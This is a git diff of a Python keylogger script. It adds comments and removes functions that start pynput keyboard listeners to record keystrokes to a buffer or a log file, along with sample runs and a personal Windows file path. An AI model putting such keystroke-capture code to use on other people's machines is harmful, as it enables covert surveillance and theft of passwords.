@@ -19,7 +19,7 @@ global FILE_PATH_LOG
 def get_path(path):
     FILE_PATH_LOG = path
 
-
+#writes to buffer
 def keyPressed(key, file_path):
     global word
     
@@ -62,6 +62,7 @@ def keyPressed(key, file_path):
         except Exception as e:
             print("Error:", e)
 
+#writes to file
 def keyPressedF(key, file_path):
     global word
     
@@ -103,52 +104,5 @@ def keyPressedF(key, file_path):
 
         except Exception as e:
             print("Error:", e)
-'''
-file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
-keyPressed_with_path = partial(keyPressed, file_path=file_path)
-
-listner = keyboard.Listener(on_press = keyPressed_with_path)
-listner.start()
-time.sleep(5)
-listner.stop()
-print(buffer_words)
-'''
-
-def keyboard_logger_pathed(path):
-    keyPressed_with_path = partial(keyPressed, file_path=path)
-
-    listner = keyboard.Listener(on_press = keyPressed_with_path)
-    listner.start()
-    time.sleep(5)
-    listner.stop()
-    return buffer_words
-    #print(buffer_words)
-
-def keyboard_logger_pathed_without_timer(path):
-    keyPressed_with_path = partial(keyPressed, file_path=path)
-
-    listner = keyboard.Listener(on_press = keyPressed_with_path)
-    listner.start()
-    #time.sleep(5)
-
-    try:
-        while not stop_event.is_set():
-            threading.Event().wait(0.1)
-    finally:
-        listner.stop()
-        print('keylogger has stopped')
-    
-    #listner.stop()
-    return buffer_words
-    #print(buffer_words)
 
 
-'''
-#sample
-listner = keyboard.Listener(on_press = keyPressed)
-listner.start()
-time.sleep(5)
-listner.stop()
-print(buffer_words)
-
-'''
